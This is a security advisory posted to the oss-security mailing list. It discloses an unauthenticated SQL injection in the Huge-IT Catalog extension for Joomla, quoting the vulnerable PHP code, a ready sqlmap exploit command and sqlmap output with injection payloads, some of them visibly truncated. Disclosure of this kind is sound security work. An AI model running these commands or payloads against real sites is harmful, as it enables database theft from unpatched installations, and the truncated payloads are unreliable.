  oss-security - Unauthenticated SQL Injection in Huge-IT Catalog for Joomla            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Fri, 23 Sep From: "Larry W. Cashdollar" <larry0@...com> To: oss-security@...ts.openwall.com Subject: Unauthenticated SQL Injection in Huge-IT Catalog for Joomla   Title: Unauthenticated SQL Injection in Huge-IT Catalog for Joomla Author: Larry W. Cashdollar, @_larry0 Date: Download Site: http://huge-it.com/joomla-catalog/ Vendor: huge-it.com Vendor Notified: Vendor Contact: info@...e-it.com Description: Huge-IT Product Catalog is made for demonstration, sale, advertisements for your products. Imagine a stand with a variety of catalogs with a specific product category. To imagine is not difficult, to use is even easier. Vulnerability: The following code does not prevent an unauthenticated user from injecting SQL into functions via 'load_more_elements_into_catalog' located in ajax_url.php. Vulnerable Code in : ajax_url.php 11 define('_JEXEC', 1); 12 defined('_JEXEC') or die('Restircted access'); . . . } elseif ($_POST["post"] == "load_more_elements_into_catalog") { $catalog_id = $_POST["catalog_id"]; $old_count = $_POST["old_count"]; $count_into_page = $_POST["count_into_page"]; $show_thumbs = $_POST["show_thumbs"]; $show_description = $_POST["show_description"]; $show_linkbutton = $_POST["show_linkbutton"]; $parmalink = $_POST["parmalink"]; $level = $_POST['level']; . . . $query->select('*'); $query->from('#__huge_it_catalog_products'); $query->where('catalog_id =' . $catalog_id); $query->order('ordering asc'); $db->setQuery($query, $from, $count_into_page);  Exploit Code: $ sqlmap -u 'http://example.com/components/com_catalog/ajax_url.php' --data="prod_page=1&post=load_more_elements_into_catalog&catalog_id=*&old_count=*&count_into_page=*&show_thumbs=*&show_description=*&parmalink=*" --level=5 --risk=3   Parameter: #1* ((custom) POST)  Type: error-based  Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)  Payload: OR 1 GROUP BY (CASE WHEN THEN 1 ELSE 0 HAVING MIN(0)#&old_count=&count_into_page=&show_thumbs=&show_description=&parmalink=    Type: AND/OR time-based blind  Title: MySQL >= time-based blind - Parameter replace  Payload: prod_page=1&post=load_more_elements_into_catalog&catalog_id=(CASE WHEN THEN SLEEP(5) ELSE END)&old_count=&count_into_page=&show_thumbs=&show_description=&parmalink=    Type: UNION query  Title: Generic UNION query (random number) - 15 columns  Payload: UNION ALL SELECT FvOy&old_count=&count_into_page=&show_thumbs=&show_description=&parmalink= --- [INFO] the back-end DBMS is MySQL web server operating system: Linux Debian 8.0 (jessie) web application technology: Apache back-end DBMS: MySQL >= [WARNING] HTTP error codes detected during run: (Internal Server Error) - times [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com'   [*] shutting down at    Advisory:  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      